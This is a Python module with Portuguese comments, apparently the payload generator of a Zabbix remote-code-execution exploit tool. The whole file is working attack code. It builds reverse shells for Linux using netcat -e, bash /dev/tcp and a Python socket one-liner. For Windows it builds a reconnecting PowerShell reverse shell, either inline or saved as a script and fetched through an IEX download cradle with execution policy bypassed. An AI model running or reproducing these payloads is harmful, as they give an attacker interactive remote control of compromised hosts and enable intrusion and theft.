"""
Módulo gerador de payloads para o Zabbix RCE Exploit
Gera payloads para diferentes sistemas operacionais e métodos
"""

import os
import uuid
from pathlib import Path
from typing import Dict, Optional


class PayloadGenerator:
    """Gerador de payloads para exploits"""
    
    def __init__(self, payloads_dir="payloads"):
        self.payloads_dir = Path(payloads_dir)
        self.payloads_dir.mkdir(exist_ok=True)
        
        # Métodos disponíveis por sistema operacional
        self.linux_methods = ['netcat', 'bash', 'python']
        self.windows_methods = ['powershell', 'direct']
    
    def generate_linux_payload(self, method: str, ip_shell: str, port: int) -> Dict[str, str]:
        """Gera payload para sistemas Linux"""
        if method not in self.linux_methods:
            raise ValueError(f"Método '{method}' não suportado para Linux. Use: {self.linux_methods}")
        
        payloads = {
            'netcat': f"nc -e /bin/bash {ip_shell} {port}",
            'bash': f"bash -i >& /dev/tcp/{ip_shell}/{port} 0>&1",
            'python': f"python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip_shell}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i'])\""
        }
        
        payload = payloads[method]
        
        return {
            'command': payload,
            'method': method,
            'os_type': 'linux',
            'description': f"Linux reverse shell usando {method}"
        }
    
    def generate_windows_payload(self, method: str, ip_shell: str, port: int) -> Dict[str, str]:
        """Gera payload para sistemas Windows"""
        if method not in self.windows_methods:
            raise ValueError(f"Método '{method}' não suportado para Windows. Use: {self.windows_methods}")
        
        if method == 'powershell':
            return self._generate_powershell_payload(ip_shell, port)
        elif method == 'direct':
            return self._generate_direct_powershell_payload(ip_shell, port)
    
    def _generate_powershell_payload(self, ip_shell: str, port: int) -> Dict[str, str]:
        """Gera payload PowerShell com download via HTTP"""
        # Gera nome único para o arquivo
        filename = f"ps1_{uuid.uuid4().hex[:8]}.ps1"
        filepath = self.payloads_dir / filename
        
        # Payload PowerShell para reverse shell (versão melhorada com reconexão)
        ps_payload = f"""
do {{
    Start-Sleep -Seconds 1
    try {{
        $ClienteTCP = New-Object Net.Sockets.TCPClient("{ip_shell}", {port})
    }} catch {{}}
}} until ($ClienteTCP.Connected)

$FluxoDeRede = $ClienteTCP.GetStream()
$EscritorDeFluxo = New-Object IO.StreamWriter($FluxoDeRede)

function EscreverNoFluxo ($Texto) {{
    [byte[]]$script:BufferDeRecepcao = 0..$ClienteTCP.ReceiveBufferSize | % {{0}}
    $EscritorDeFluxo.Write($Texto + 'SHELL> ')
    $EscritorDeFluxo.Flush()
}}

EscreverNoFluxo ''

while(($BytesLidos = $FluxoDeRede.Read($BufferDeRecepcao, 0, $BufferDeRecepcao.Length)) -gt 0) {{
    $ComandoRecebido = ([text.encoding]::UTF8).GetString($BufferDeRecepcao, 0, $BytesLidos - 1)
    $SaidaDeComando = try {{
        Invoke-Expression $ComandoRecebido 2>&1 | Out-String
    }} catch {{
        $_ | Out-String
    }}
    EscreverNoFluxo ($SaidaDeComando)
}}

$EscritorDeFluxo.Close()
"""
        
        # Salva arquivo PowerShell
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(ps_payload.strip())
        
        # Comando para download e execução
        download_command = f"powershell -ExecutionPolicy Bypass -Command \"IEX(New-Object Net.WebClient).downloadString('http://{ip_shell}:8000/{filename}')\""
        
        return {
            'command': download_command,
            'method': 'powershell',
            'os_type': 'windows',
            'description': 'Windows PowerShell avançado via HTTP (reconexão automática)',
            'payload_file': str(filepath),
            'http_url': f"http://{ip_shell}:8000/{filename}"
        }
    
    def _generate_direct_powershell_payload(self, ip_shell: str, port: int) -> Dict[str, str]:
        """Gera payload PowerShell direto (inline)"""
        # Payload PowerShell compactado para execução direta (versão melhorada)
        compact_payload = f"powershell -ExecutionPolicy Bypass -Command \"do{{Start-Sleep 1;try{{$c=New-Object Net.Sockets.TCPClient('{ip_shell}',{port})}}catch{{}}}}until($c.Connected);$s=$c.GetStream();$w=New-Object IO.StreamWriter($s);function Write-Stream($t){{[byte[]]$script:b=0..$c.ReceiveBufferSize|%{{0}};$w.Write($t+'SHELL> ');$w.Flush()}};Write-Stream '';while(($i=$s.Read($b,0,$b.Length)) -gt 0){{$cmd=([text.encoding]::UTF8).GetString($b,0,$i-1);$out=try{{iex $cmd 2>&1|Out-String}}catch{{$_|Out-String}};Write-Stream($out)}};$w.Close()\""
        
        return {
            'command': compact_payload,
            'method': 'direct',
            'os_type': 'windows',
            'description': 'Windows PowerShell inline melhorado (reconexão automática)'
        }
    
    def get_available_methods(self, os_type: str) -> list:
        """Retorna métodos disponíveis para um sistema operacional"""
        if os_type.lower() == 'linux':
            return self.linux_methods.copy()
        elif os_type.lower() == 'windows':
            return self.windows_methods.copy()
        else:
            return []
    
    def get_method_description(self, os_type: str, method: str) -> str:
        """Retorna descrição de um método específico"""
        descriptions = {
            'linux': {
                'netcat': 'Netcat tradicional com -e (mais confiável)',
                'bash': 'Redirecionamento TCP nativo do Bash',
                'python': 'Socket Python (requer Python instalado)'
            },
            'windows': {
                'powershell': 'PowerShell avançado via HTTP (reconexão automática)',
                'direct': 'PowerShell inline melhorado (execução direta com retry)'
            }
        }
        
        return descriptions.get(os_type.lower(), {}).get(method, 'Descrição não disponível')
    
    def cleanup_payloads(self):
        """Remove arquivos de payload gerados"""
        if self.payloads_dir.exists():
            for file in self.payloads_dir.glob("ps1_*.ps1"):
                try:
                    file.unlink()
                    print(f"Removido: {file.name}")
                except Exception as e:
                    print(f"Erro ao remover {file.name}: {e}")
    
    def list_generated_payloads(self) -> list:
        """Lista arquivos de payload gerados"""
        if not self.payloads_dir.exists():
            return []
        
        return [f.name for f in self.payloads_dir.glob("ps1_*.ps1")]